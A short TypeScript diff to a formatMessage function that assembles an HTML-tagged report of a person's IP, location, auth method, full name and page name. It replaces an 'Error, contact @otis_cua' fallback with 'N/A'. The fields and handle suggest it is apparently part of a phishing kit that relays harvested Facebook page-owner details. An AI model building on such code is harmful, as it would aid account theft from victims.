@@ -157,8 +157,8 @@ function formatMessage(data: any): string {
     const d = normalizeData(data);
     const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
     return `
-<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
-<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
+<b>Ip:</b> <code>${escapeHtml(d.ip || 'N/A')}</code>
+<b>Location:</b> <code>${escapeHtml(d.location || 'N/A')}</code>
 -----------------------------
 <b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
 <b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
